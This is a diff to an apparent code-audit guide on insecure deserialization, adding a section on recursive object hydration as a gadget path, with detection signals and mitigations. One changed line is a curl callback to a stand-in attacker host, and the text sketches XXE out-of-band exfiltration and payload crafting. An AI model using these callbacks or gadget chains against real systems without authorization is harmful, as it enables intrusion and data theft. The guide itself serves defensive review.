@@ -46,6 +46,13 @@ Insecure deserialization happens when an application reconstructs objects from u
 - Various levels of polymorphic type support
 - Look for class name fields in JSON (`@class`, `@type`, `class`)
 
+### Nested / recursive object-hydration ("nested deserialization")
+
+A **framework request-body → object mapper** becomes a deserialization gadget engine even without `unserialize()`/`readObject()` or an explicit `@type` field. When a JSON/XML/form API declares a parameter of a concrete class, the framework instantiates it by matching request keys to **constructor parameters or setter names**, and — critically — **recurses**: a constructor parameter (or setter) whose type is *another* class is itself hydrated from the correspondingly-nested request object. With no type allowlist, the attacker walks the constructor/setter graph from the API's declared type through arbitrary intermediate classes until reaching a **sink class** whose constructor/setter has a dangerous side effect — e.g. an XML-parser element (a `SimpleXMLElement` constructor, or any XML-document class that accepts a `sourceData`/URL argument) that parses attacker XML with external-entity loading → **XXE** (blind file read / SSRF / OOB exfil via an external DTD + `php://filter/convert.base64-encode`), a URL/connection field → SSRF, or a getter with a side effect invoked during a serialize round-trip.
+- **VULN shape**: a "create object of declared type from array/JSON" routine that resolves constructor args by name and instantiates nested non-primitive parameters recursively, reachable from an HTTP endpoint, with no class/type allowlist. PHP: a DI/object-manager factory that builds an object of a declared class from a request array (`create($className, $dataFromRequest)`), or a REST input-processor that maps body keys to constructor params/setters; Java Jackson/Spring bean-binding of `Object`/interface/`Serializable`-typed fields; any DI-container `create($class, $data)` fed request data. The **depth** of the class graph (5+ nested non-primitive params) is the attack surface, and generic parameter names (`data`, `sourceData`, `options`, `config`) without type hints widen it.
+- **SAST signals**: a request-driven DI/factory `create(`/`make(` given a class name plus a data array; a REST/RPC input processor that maps body keys to setters/ctor params without a subtype allowlist; a sink-class constructor reachable from such hydration (`SimpleXMLElement(` from a hydrated field, or an XML-document class taking a `sourceData`/URL argument; XML parser without `LIBXML_NONET`/entity loading disabled — cross-ref `xxe.md`). Related but distinct from mass-assignment (attribute overwrite, `mass_assignment.md`): here the attacker chooses which **classes get instantiated**, not just which fields get set.
+- **SAFE**: bind request bodies to explicit flat DTOs (no recursive arbitrary-class instantiation); allowlist permitted subtypes; disable XML external entities in every XML sink; never let request keys select constructor parameter *types*.
+
 ### YAML Deserialization
 
 **SnakeYAML**
@@ -167,7 +174,7 @@ To prove exploitability of a deserialization sink, generate a language-appropria
 - **Python** (`pickle`/`PyYAML`) — craft a `__reduce__` payload (e.g. via `Fickling`) that triggers a benign OAST callback.
 - **Node** (`node-serialize`) — IIFE payload in the serialized `_$$ND_FUNC$$_` field.
 
-Use a harmless callback (`curl http://YOUR-COLLABORATOR.oast.fun/deser`) as the gadget action first; only escalate to command execution with authorization.
+Use a harmless callback (`curl http://CANARY.attacker.example/deser`) as the gadget action first; only escalate to command execution with authorization.
 
 ## Severity Assessment
 
